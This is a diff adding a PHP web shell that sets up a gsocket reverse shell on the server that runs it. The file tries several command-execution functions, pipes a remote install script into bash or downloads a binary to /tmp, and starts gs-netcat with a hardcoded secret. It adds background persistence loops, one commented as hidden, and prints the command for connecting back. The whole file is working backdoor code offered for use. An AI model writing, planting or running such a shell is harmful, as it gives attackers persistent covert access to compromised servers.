@@ -1,0 +1,126 @@
+<?php
+// Guaranteed gsocket reverse shell with multiple fallbacks
+@set_time_limit(0);
+@ini_set('html_errors', '0');
+@ini_set('display_errors', '0');
+error_reporting(0);
+
+function execute($cmd) {
+    $output = "";
+    $cmd = $cmd . " 2>&1";
+    
+    if (function_exists('system')) {
+        ob_start();
+        @system($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+        return $output;
+    }
+    if (function_exists('shell_exec')) {
+        return @shell_exec($cmd);
+    }
+    if (function_exists('exec')) {
+        @exec($cmd, $result);
+        return implode("\n", $result);
+    }
+    if (function_exists('passthru')) {
+        ob_start();
+        @passthru($cmd);
+        $output = ob_get_contents();
+        ob_end_clean();
+        return $output;
+    }
+    if (function_exists('proc_open')) {
+        $pipes = array();
+        $process = @proc_open($cmd, array(
+            0 => array("pipe", "r"),
+            1 => array("pipe", "w"),
+            2 => array("pipe", "w")
+        ), $pipes);
+        if (is_resource($process)) {
+            $output = stream_get_contents($pipes[1]);
+            @proc_close($process);
+            return $output;
+        }
+    }
+    return "";
+}
+
+// YOUR SECRET KEY - CHANGE THIS
+$secret = "tootsie1337";
+
+echo "Starting gsocket reverse shell with key: $secret<br>";
+echo "Connecting...<br>";
+flush();
+
+// Method 1: Direct gsocket execution (if installed)
+$cmd1 = "gs-netcat -s '$secret' -i -l -p 443 2>/dev/null &";
+echo "Trying Method 1: Direct gsocket...<br>";
+execute($cmd1);
+
+// Method 2: Install gsocket then execute
+$cmd2 = "(curl -fsSLk https://gsocket.io/install.sh 2>/dev/null || wget -qO- https://gsocket.io/install.sh 2>/dev/null) | bash -s -- -y >/dev/null 2>&1 && gs-netcat -s '$secret' -i -l -p 443 2>/dev/null &";
+echo "Trying Method 2: Install + execute...<br>";
+execute($cmd2);
+
+// Method 3: Download static binary and run
+$cmd3 = "((curl -fsSLk https://github.com/hackerschoice/gsocket/raw/master/bin/gs-netcat -o /tmp/gs && chmod +x /tmp/gs) || (wget -q https://github.com/hackerschoice/gsocket/raw/master/bin/gs-netcat -O /tmp/gs && chmod +x /tmp/gs)) && /tmp/gs -s '$secret' -i -l -p 443 2>/dev/null &";
+echo "Trying Method 3: Static binary...<br>";
+execute($cmd3);
+
+// Method 4: Multiple connection attempts in background
+$cmd4 = "for i in 1 2 3 4 5; do (gs-netcat -s '$secret' -i -l -p 443 2>/dev/null || /tmp/gs-netcat -s '$secret' -i -l -p 443 2>/dev/null) & sleep 2; done";
+echo "Trying Method 4: Multiple attempts...<br>";
+execute($cmd4);
+
+// Wait a bit for connection to establish
+sleep(3);
+
+// Check if gsocket is running
+$check = execute("ps aux | grep -v grep | grep 'gs-netcat.*$secret'");
+if (!empty($check)) {
+    echo "<span style='color: green; font-weight: bold;'>SUCCESS: gsocket is running!</span><br>";
+    echo "Process info:<br><pre>$check</pre>";
+    echo "<br>Connect using: <code>gs-netcat -s '$secret' -i</code>";
+} else {
+    echo "<span style='color: red;'>Failed to start gsocket. Trying alternative methods...</span><br>";
+    
+    // Alternative: Use nohup for persistence
+    $alt_cmd = "nohup gs-netcat -s '$secret' -i -l -p 443 >/dev/null 2>&1 &";
+    execute($alt_cmd);
+    sleep(2);
+    
+    $check = execute("ps aux | grep -v grep | grep 'gs-netcat'");
+    if (!empty($check)) {
+        echo "<span style='color: green; font-weight: bold;'>SUCCESS: gsocket started with nohup!</span><br>";
+    } else {
+        echo "<span style='color: red;'>All methods failed. Checking system...</span><br>";
+        
+        // System diagnostics
+        echo "System check:<br>";
+        echo "curl: " . (execute("which curl") ? "Available" : "Not found") . "<br>";
+        echo "wget: " . (execute("which wget") ? "Available" : "Not found") . "<br>";
+        echo "bash: " . (execute("which bash") ? "Available" : "Not found") . "<br>";
+        echo "gs-netcat: " . (execute("which gs-netcat") ? "Available" : "Not found") . "<br>";
+    }
+}
+
+// Keep trying in background
+echo "<br><br>Starting background persistence...<br>";
+$persist = "while true; do (ps aux | grep -v grep | grep '$secret' >/dev/null || (gs-netcat -s '$secret' -i -l -p 443 2>/dev/null &)); sleep 30; done >/dev/null 2>&1 &";
+execute($persist);
+
+echo "<br>Reverse shell should be active. Connect from your machine with:<br>";
+echo "<code>gs-netcat -s '$secret' -i</code>";
+
+// Continuous connection attempt loop (hidden)
+$loop_cmd = "while true; do 
+    if ! ps aux | grep -v grep | grep -q '$secret'; then
+        (gs-netcat -s '$secret' -i -l -p 443 >/dev/null 2>&1 &)
+        (/tmp/gs-netcat -s '$secret' -i -l -p 443 >/dev/null 2>&1 &)
+    fi
+    sleep 10
+done >/dev/null 2>&1 &";
+
+execute($loop_cmd);
+?>
